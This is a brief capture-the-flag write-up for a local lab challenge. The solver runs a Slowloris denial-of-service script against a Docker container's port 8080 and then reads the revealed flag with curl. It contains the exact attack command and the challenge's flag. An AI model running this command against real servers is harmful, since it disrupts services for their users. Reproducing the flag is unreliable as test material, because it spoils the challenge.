# Slowloris DoS Challenge Writeup


## Objective
Keep more than 200 simultaneous TCP connections alive to port 8080 of the victim container for at least 30 seconds to retrieve the flag.

---

### 1️⃣ Environment Setup

Check if the victim container is running:

docker ps

### 2️⃣ Accessing the Victim Container

Enter the victim container:

docker exec -it victim bash
cd /app
ls


#### Expected output:

app.py
slowloris.py

### 3️⃣ Launching the Slowloris Attack

Inside the victim container, run:

python3 slowloris.py localhost -p 8080 -s 500

### 4️⃣ Retrieving the Flag

Open a separate terminal on your host machine and run:

curl http://localhost:8080


Initially, you will see:

Service OK


After ~30 seconds of sustained load, the flag is revealed:

CTF{DoS_me_if_you_can}

### 5️⃣ Stopping the Attack

In the attacker shell (where slowloris.py is running), press:

Ctrl+C
